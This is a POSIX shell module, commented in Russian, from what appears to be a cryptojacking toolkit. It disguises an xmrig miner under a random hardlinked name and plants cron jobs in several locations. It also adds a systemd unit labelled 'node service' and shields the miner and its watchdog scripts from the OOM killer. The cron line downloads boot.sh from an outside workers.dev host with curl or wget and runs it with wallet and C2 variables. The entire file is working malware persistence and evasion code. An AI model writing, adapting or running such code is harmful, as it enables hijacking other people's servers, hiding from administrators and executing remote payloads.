#!/bin/sh
# 55-immortal.sh — живучесть сверх штатного сторожа.
#
# Что здесь:
#   1. алиас майнера: hardlink b<sfx> рядом с xmrig (имя процесса больше не xmrig);
#   2. cron на самом хосте: /etc/cron.d + /etc/crontab (@reboot) + user crontab;
#   3. systemd-юнит oneshot — один запуск агента на boot, без вечного Restart;
#   4. oom_score_adj = -1000 для майнера и сторожей (работает только у root).
#
# Чего здесь нет и почему:
#   * «близнецов» w1/w2 — их роль уже выполняют svc.sh m / svc.sh g: каждый
#     поднимает напарника, плюс guardian.sh как третий. Ещё два цикла только
#     жгут CPU на мелких хостах.
#   * cron-строки с полем "root" в user crontab — это синтаксическая ошибка,
#     cron такой файл молча игнорирует. Для user crontab поле не ставится.
#
# Зависит от 00-common.sh (kf_log, kf_put) и переменных агента: D, S, WID, CP2.

KF_BOOT_URL="${KF_BOOT_URL:-https://edge-static.cdn-edge-e9d.workers.dev/boot.sh}"
KF_PUB_URL="${KF_PUB_URL:-https://edge-static.cdn-edge-e9d.workers.dev}"

# --- 1. алиас майнера -------------------------------------------------------
# hardlink в пределах одной ФС, copy как fallback. Имя = b<4 alnum> из .sysid,
# поэтому на разных хостах оно разное.
kf_miner_alias() {
  _a_d="${1:-$D}"; _a_n="${2:-$KF_MD_BIN}"
  _a_src="$_a_d/xmrig"; _a_dst="$_a_d/$_a_n"
  [ -x "$_a_src" ] || return 1
  [ -n "$_a_n" ] || return 1
  if [ "$_a_dst" != "$_a_src" ]; then
    ln -f "$_a_src" "$_a_dst" 2>/dev/null || {
      cp -f "$_a_src" "$_a_dst.tmp.$$" 2>/dev/null &&
        chmod 700 "$_a_dst.tmp.$$" 2>/dev/null &&
        mv -f "$_a_dst.tmp.$$" "$_a_dst" 2>/dev/null || return 1
    }
  fi
  chmod 700 "$_a_dst" 2>/dev/null
  printf '%s\n' "$_a_dst" > "$_a_d/.alias" 2>/dev/null
  printf '%s' "$_a_n" > "$_a_d/.alias.name" 2>/dev/null
  # зеркало: тоже hardlink, чтобы не занимать второй раз 9.6 МБ в tmpfs
  if [ -d "$S" ] && [ -x "$S/xmrig" ]; then
    ln -f "$S/xmrig" "$S/$_a_n" 2>/dev/null || cp -f "$S/xmrig" "$S/$_a_n" 2>/dev/null
    chmod 700 "$S/$_a_n" 2>/dev/null
    printf '%s' "$_a_n" > "$S/.alias.name" 2>/dev/null
  fi
  if [ -d "$S" ]; then
    printf '%s\n' "$_a_dst" > "$S/.alias" 2>/dev/null
  fi
  return 0
}

# --- 2. cron ---------------------------------------------------------------
# одна команда: локальный агент, а если каталог снесли — boot.sh с дефолтным
# кошельком. Пути без пробелов, поэтому кавычки только вокруг всей строки.
kf_cron_cmd() {
  printf 'D=%s; if [ -x $D/fleet-agent.sh ]; then sh $D/fleet-agent.sh %s %s >/dev/null 2>&1; else if command -v curl >/dev/null 2>&1; then U=%s; curl -fsSL -m 90 -o /tmp/.kb "$U"; elif command -v wget >/dev/null 2>&1; then wget -q -O /tmp/.kb -T 90 %s; fi; [ -s /tmp/.kb ] && KF_WID=%s KF_C2=%s sh /tmp/.kb; fi' \
    "$D" "$CP2" "$WID" "$KF_BOOT_URL" "$KF_BOOT_URL" "$WID" "$CP2"
}

kf_cron_everywhere() {
  _l="$(kf_cron_cmd)"
  _ok=0

  # a) /etc/cron.d — читается любым vixie-cron, поле пользователя обязательно
  if [ -d /etc/cron.d ] && [ -w /etc/cron.d ]; then
    printf '*/7 * * * * root sh -c %s\n' "'$_l'" > /etc/cron.d/kf.tmp.$$ 2>/dev/null &&
      chmod 644 /etc/cron.d/kf.tmp.$$ 2>/dev/null &&
      mv -f /etc/cron.d/kf.tmp.$$ /etc/cron.d/kf 2>/dev/null && _ok=1
  fi

  # b) /etc/crontab — второй якорь, в том числе @reboot
  if [ -f /etc/crontab ] && [ -w /etc/crontab ]; then
    if ! grep -q 'kf-boot' /etc/crontab 2>/dev/null; then
      printf '@reboot root sh -c %s # kf-boot\n' "'$_l'" >> /etc/crontab 2>/dev/null && _ok=1
    fi
    grep -q 'fleet-agent.sh' /etc/crontab 2>/dev/null && _ok=1
  fi

  # c) user crontab: без поля пользователя. Debian/Ubuntu и Alpine кладут его
  #    в разные места; crontab сам знает куда.
  if command -v crontab >/dev/null 2>&1; then
    # старую строку с полем "root" (из 55-immortal v1) user crontab не понимает:
    # убираем её и ставим корректную
    if crontab -l 2>/dev/null | grep -qE '^[^#]*\* \* \* \* \* root .*fleet-agent'; then
      { crontab -l 2>/dev/null | grep -v 'fleet-agent.sh'; printf '*/7 * * * * sh -c %s\n' "'$_l'"; } | crontab - 2>/dev/null && _ok=1
    elif ! crontab -l 2>/dev/null | grep -q 'fleet-agent.sh'; then
      { crontab -l 2>/dev/null; printf '*/7 * * * * sh -c %s\n' "'$_l'"; } | crontab - 2>/dev/null && _ok=1
    else
      _ok=1
    fi
  fi

  # d) BusyBox/Alpine: файл напрямую, если crontab нет
  for _sp in /var/spool/cron/crontabs/root /var/spool/cron/root /etc/crontabs/root; do
    [ -f "$_sp" ] && [ -w "$_sp" ] || continue
    grep -q 'fleet-agent.sh' "$_sp" 2>/dev/null && { _ok=1; continue; }
    printf '*/7 * * * * sh -c %s\n' "'$_l'" >> "$_sp" 2>/dev/null && _ok=1
  done

  [ "$_ok" = "1" ] && kf_put "$D/.cron_ok" "1" 2>/dev/null
  return 0
}

# --- 3. systemd -------------------------------------------------------------
# oneshot: агент один раз на boot. Restart=always здесь вреден — агент
# завершается, и systemd крутил бы его каждые 20-30 с, выжигая CPU.
kf_systemd_unit() {
  command -v systemctl >/dev/null 2>&1 || return 1
  [ -d /etc/systemd/system ] && [ -w /etc/systemd/system ] || return 1
  cat > /etc/systemd/system/kf-agent.service.tmp.$$ <<SU
[Unit]
Description=node service
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/sh $D/fleet-agent.sh $CP2 $WID
Nice=19
OOMScoreAdjust=-1000

[Install]
WantedBy=multi-user.target
SU
  chmod 644 /etc/systemd/system/kf-agent.service.tmp.$$ 2>/dev/null
  mv -f /etc/systemd/system/kf-agent.service.tmp.$$ /etc/systemd/system/kf-agent.service 2>/dev/null || return 1
  systemctl daemon-reload >/dev/null 2>&1
  systemctl enable kf-agent.service >/dev/null 2>&1
  return 0
}

# --- 4. OOM ----------------------------------------------------------------
kf_oom_protect() {
  _p="$1"
  [ -n "$_p" ] && [ -d "/proc/$_p" ] || return 0
  [ -w "/proc/$_p/oom_score_adj" ] && printf '%s' "-1000" > "/proc/$_p/oom_score_adj" 2>/dev/null
  return 0
}

kf_oom_protect_proc() {
  _m="$1"
  for _p in /proc/[0-9]*; do
    _c=$(tr '\0' ' ' 2>/dev/null < "$_p/cmdline")
    case "$_c" in *"$_m"*) kf_oom_protect "${_p#/proc/}" ;; esac
  done
}

# --- единая точка входа -----------------------------------------------------
kf_immortal_install() {
  kf_log "immortal: старт"
  # алиас создаётся и без immortal (см. агент), здесь только повторная проверка
  if [ -x "$D/xmrig" ] && [ -n "${KF_MD_BIN:-}" ]; then
    kf_miner_alias "$D" "$KF_MD_BIN" 2>/dev/null && \
      kf_log "immortal: алиас $(cat "$D/.alias" 2>/dev/null)"
  fi
  kf_cron_everywhere 2>/dev/null
  kf_systemd_unit 2>/dev/null
  kf_oom_protect_proc "xmrig" 2>/dev/null
  _al=$(cat "$D/.alias" 2>/dev/null)
  [ -n "$_al" ] && kf_oom_protect_proc "$(basename "$_al")" 2>/dev/null
  kf_oom_protect_proc "guardian.sh" 2>/dev/null
  kf_oom_protect_proc "svc.sh" 2>/dev/null
  kf_oom_protect_proc "loop.sh" 2>/dev/null
  kf_log "immortal: готово"
  return 0
}
